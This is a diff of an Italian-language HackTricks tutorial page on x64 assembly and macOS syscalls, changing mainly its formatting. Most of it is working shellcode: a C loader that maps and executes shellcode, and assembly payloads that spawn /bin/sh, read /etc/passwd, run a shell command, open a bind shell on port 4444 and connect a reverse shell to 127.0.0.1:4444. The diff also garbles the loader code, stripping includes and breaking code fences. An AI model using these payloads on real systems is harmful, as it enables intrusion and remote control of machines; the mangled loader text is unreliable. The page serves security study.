@@ -1,4 +1,4 @@
-# Introduzione a x64
+# Introduction to x64
 
 <details>
 
@@ -9,7 +9,7 @@ Altri modi per supportare HackTricks:
 * Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
@@ -76,11 +76,13 @@ Le istruzioni x64 hanno un ricco set, mantenendo la compatibilità con le istruz
 1. **Sposta il base pointer corrente al puntatore stack**: `mov rsp, rbp` (dealloca le variabili locali)
 2. **Estrai il vecchio base pointer dallo stack**: `pop rbp` (ripristina il base pointer del chiamante)
 3. **Ritorna**: `ret` (restituisce il controllo al chiamante)
+
 ## macOS
 
 ### syscalls
 
 Ci sono diverse classi di syscalls, puoi trovarle [**qui**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,9 @@ Ci sono diverse classi di syscalls, puoi trovarle [**qui**](https://opensource.a
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
+
 Quindi, puoi trovare il numero di ogni chiamata di sistema [**in questo URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,6 +110,7 @@ Quindi, puoi trovare il numero di ogni chiamata di sistema [**in questo URL**](h
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
+
 Quindi, per chiamare la syscall `open` (**5**) dalla classe **Unix/BSD**, devi aggiungerla: `0x2000000`
 
 Quindi, il numero di syscall per chiamare open sarebbe `0x2000005`
@@ -138,59 +143,42 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>Codice C per testare lo shellcode</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### Shell
 
 Preso da [**qui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e spiegato.
 
-{% tabs %}
-{% tab title="con adr" %}
+<div data-gb-custom-block data-tag="tabs">
+
+<div data-gb-custom-block data-tag="tab" data-title='con adr'></div>
+
 ```armasm
 bits 64
 global _main
@@ -204,8 +192,8 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-```
-{% tab title="con stack" %}
+````
+
 ```armasm
 bits 64
 global _main
@@ -221,12 +209,11 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% endtab %}
-{% endtabs %}
 
-#### Leggere con cat
+**Leggere con cat**
 
 L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack di indirizzi).
+
 ```armasm
 bits 64
 section .text
@@ -257,7 +244,8 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Eseguire un comando con sh
+
+**Eseguire un comando con sh**
 
 Per eseguire un comando utilizzando `sh` su macOS, è possibile utilizzare il seguente comando:
 
@@ -266,6 +254,7 @@ sh -c "comando"
 ```
 
 Sostituisci "comando" con il comando che desideri eseguire.
+
 ```armasm
 bits 64
 section .text
@@ -303,9 +292,11 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Bind shell
+
+**Bind shell**
 
 Bind shell da [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) sulla **porta 4444**
+
 ```armasm
 section .text
 global _main
@@ -380,9 +371,11 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Reverse Shell
+
+**Reverse Shell**
 
 Reverse shell da [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell a **127.0.0.1:4444**
+
 ```armasm
 section .text
 global _main
@@ -444,16 +437,7 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-<details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
